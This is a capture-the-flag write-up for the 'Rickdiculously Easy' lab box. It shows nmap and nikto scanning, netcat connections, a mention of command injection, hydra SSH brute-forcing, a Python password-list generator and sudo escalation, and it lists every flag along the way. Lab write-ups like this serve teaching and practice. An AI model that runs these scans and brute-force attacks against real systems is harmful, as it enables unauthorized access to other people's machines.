# Rickdiculously Easy

## Port Scanning

The box was up and running, all I needed was an IP address.

```
root@kali:~# netdiscover -r 192.168.43.0/24
```

Then, I moved onto our beloved port scanning phrase with Nmap:

```
root@kali:~# nmap -v -sS -O -A -p- 192.168.43.27
---snip---
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 0        0              42 Aug 22 05:10 FLAG.txt
|_drwxr-xr-x    2 0        0               6 Feb 12  2017 pub
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.43.125
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open  ssh?
| fingerprint-strings: 
|   NULL: 
|_    Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-31-generic x86_64)
80/tcp    open  http    Apache httpd 2.4.27 ((Fedora))
| http-methods: 
|   Supported Methods: OPTIONS HEAD GET POST TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.27 (Fedora)
|_http-title: Morty's Website
9090/tcp  open  http    Cockpit web service
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Did not follow redirect to https://192.168.43.27:9090/
13337/tcp open  unknown
| fingerprint-strings: 
|   NULL: 
|_    FLAG:{TheyFoundMyBackDoorMorty}-10Points
22222/tcp open  ssh     OpenSSH 7.5 (protocol 2.0)
| ssh-hostkey: 
|   2048 b4:11:56:7f:c0:36:96:7c:d0:99:dd:53:95:22:97:4f (RSA)
|   256 20:67:ed:d9:39:88:f9:ed:0d:af:8c:8e:8a:45:6e:0e (ECDSA)
|_  256 a6:84:fa:0f:df:e0:dc:e2:9a:2d:e7:13:3c:e7:50:a9 (EdDSA)
60000/tcp open  unknown
|_drda-info: ERROR
| fingerprint-strings: 
|   NULL, ibm-db2: 
|_    Welcome to Ricks half baked reverse shell...
---snip---
```

The first open port is FTP, which allowed anonymous login and the first flag was already visible.

> First Flag: FLAG{Whoa this is unexpected} — 10 Points

Indeed, this was way too easy. At this point, I couldn’t make use of the SSH service and I moved on to port 80. Nikto is the first tool, which comes to my mind when I see a web server.

```

root@kali:~# nikto -h 192.168.43.27
---snip---
+ OSVDB-3268: /passwords/: Directory indexing found.
+ OSVDB-3092: /passwords/: This might be interesting...
---snip---
```

Another flag in the bag.

> Second Flag: FLAG{Yeah d- just don’t do it.} — 10 Points

I inspected the HTML file and there was a password comment: winter

I ran Nikto on port 9090, but the result was flooded with a large number of false-positives. I went to visit this login page and the flag was right in front of me.

> Third Flag: FLAG {There is no Zeus, in your face!} — 10 Points

## The Rabbit Hole

Well, this login page…To be honest, I really thought that this must be a way in. I didn’t even consider the possibility of a rabbit hole. There were some hidden HTML element and those raised my suspicion even more. I spent hours, even days figuring out what did I miss. My problem was, I forgot about the other ports and opportunities…. Anyways, let’s continue.
The next port is 13337. After the connection established, a “welcome” flag presented itself.

```
root@kali:~# nc 192.168.43.27 13337
```

> Fourth Flag: FLAG:{TheyFoundMyBackDoorMorty}-10Points

I skipped the SSH again on port 22222. I was curious for port 60000.

```
root@kali:~# nc 192.168.43.27 60000
```

It’s a reverse shell and yet another flag. Like a piece of cake, right?

> Fifth Flag: FLAG{Flip the pickle Morty!} — 10 Points

I was stuck again, but out of the blue, I had an idea. What about the robots.txt? It turned out, it was a jackpot.

```
They're Robots Morty! It's ok to shoot them! 
They're just Robots!/cgi-bin/root_shell.cgi
/cgi-bin/tracertool.cgi
/cgi-bin/*
```

It made me sad that the root shell is under construction. On the other hand, the tracertool worked like charm. I mean, sweet command injection!
At this point, I had 3 users and a password. I let hydra determine, whose password this is. SSH was unsuccessful on port 22, however on 22222...

```
root@kali:~# hydra -L users.txt -p winter ssh://192.168.43.27:22222
---snip---
[DATA] attacking ssh://192.168.43.27:22222/
[22222][ssh] host: 192.168.43.27   login: Summer   password: winter
1 of 1 target successfully completed, 1 valid password found
```

The next flag was in Summer’s home folder. By the way, I had to use the `less` and `more` commands everywhere, because the `cat` command has been replaced with a nice ascii cat banner.

> Sixth Flag: FLAG{Get off the high road Summer!} — 10 Points

I visited some promising directories (unsuccessfully) before I navigated to Morty's home folder. I found a `Safe_Password.jpg` and a password protected zipped text file. I couldn’t run strings on the jpg file, so I downloaded them to my machine.

```
root@kali:~/Downloads# strings Safe_Password.jpg | grep word
8 The Safe Password: File: /home/Morty/journal.txt.zip. Password: Meeseek
```

The extracted `journal.txt` contained another flag.

> Seventh Flag: FLAG: {131333} — 20 Points

In RickSanchez’s home folder, there were 2 folders. The second one was named `ThisDoesntContainAnyFlags`, but I had to try. The creator didn’t lie, no flag was found. `RICKS_SAFE` folder was a place for an ELF executable.
I had to copy it to Summer’s home folder in order to execute it. The program needed command line arguments… I was struggling to come up with a good idea. Then, it hit me. Did you notice the difference between the other flags and the last flag? Yeah…

```
[Summer@localhost ~]$ ./safe 1313333
decrypt:  FLAG{And Awwwaaaaayyyy we Go!} - 20 PointsRicks password hints:
(This is incase I forget.. I just hope I don't forget how to write a script 
to generate potential passwords. Also, sudo is wheely good.)
Follow these clues, in order1 uppercase character
1 digit
One of the words in my old bands name.
```

> Eighth Flag: FLAG{And Awwwaaaaayyyy we Go!} — 20 Points

Well, these are pretty clear instructions. I searched for that band and the first result was `The Flesh Curtains`. I have decided to write my own python script for generating passwords. Here is the result:

```python
#!/bin/python
import string
import os
import itertools

print "Generating passwords..."

uppercase_letters = list(string.ascii_uppercase)
digits = range(0, 9)
words = ["Flesh", "Curtains"]

# calculate the product of the provided values and store them in a list
combinations = list(itertools.product(uppercase_letters, digits, words))
    
file_name = 'passwords.txt'

# write passwords to the file
with open(file_name, "w") as file:
    for combination in combinations:
        file.write(str(combination[0]) + str(combination[1]) + str(combination[2]) + "\n")

# close the file
file.close()
print "Password list has been successfully generated!"
```

## The Final Stage

I had a password list and a username. That’s all I needed! SSH on port 22 was a dead end again, unlike port 22222.

```
root@kali:~# hydra -l RickSanchez -P passwords.lst ssh://192.168.43.27:22222
---snip---
[DATA] attacking ssh://192.168.43.27:22222/
[22222][ssh] host: 192.168.43.27   login: RickSanchez   password: P7Curtains
1 of 1 target successfully completed, 1 valid password found
---snip---
```

Just one thing left, I have to gain root access. It’s not that hard since our user (RickSanchez) can easily run `sudo su`. In the root user home directory, I found the final flag. Game over!

> Nineth Flag: FLAG: {Ionic Defibrillator} — 30 points


